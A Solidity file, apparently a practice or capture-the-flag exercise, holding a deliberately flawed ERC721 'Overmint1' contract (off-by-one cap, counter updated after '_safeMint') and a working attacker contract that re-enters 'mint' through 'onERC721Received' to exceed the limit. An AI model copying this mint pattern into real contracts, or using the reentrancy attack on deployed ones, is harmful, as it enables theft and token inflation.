// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

import {console} from "forge-std/console.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1Attacker is IERC721Receiver {
    bool public overmintFlag;
    Overmint1 overmint1NFTContract;

    constructor(address Overmint1NFTAddress) {
        overmint1NFTContract = Overmint1(Overmint1NFTAddress);
    }

    function attackAndOvermint() external {
        overmint1NFTContract.mint();
        overmint1NFTContract.mint();
        overmint1NFTContract.mint();
        // Only after we have minted 3 NFT's we will mint another one in the onERC721Received
        overmintFlag = true;
        overmint1NFTContract.mint();
    }

    function getNFTBalance() external view returns (uint256) {
        return (overmint1NFTContract.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public override returns (bytes4) {
        if (overmintFlag) {
            // Prevent minting from recursion
            overmintFlag = false;
            overmint1NFTContract.mint();
        }
        return this.onERC721Received.selector;
    }
}
